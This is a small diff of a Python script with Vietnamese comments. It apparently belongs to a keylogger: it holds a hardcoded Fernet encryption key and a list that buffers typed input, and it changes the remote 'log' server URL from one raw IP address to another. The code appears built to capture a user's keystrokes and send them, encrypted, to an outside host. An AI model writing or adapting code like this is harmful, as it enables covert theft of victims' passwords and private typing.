@@ -13,7 +13,7 @@ encryption_key = b'X9w43Qkdw3439fkeudkjd9kXnFAk3FxpdCQq0J1kWxs='
 cipher_suite = Fernet(encryption_key)
 
 # URL của server để nhận log
-server_url = 'http://54.254.85.4:5000/log'  # Địa chỉ server muốn gửi log
+server_url = 'http://54.255.152.211:5000/log'  # Địa chỉ server muốn gửi log
 
 # Danh sách để lưu trữ các chuỗi ký tự được nhập
 input_buffer = []
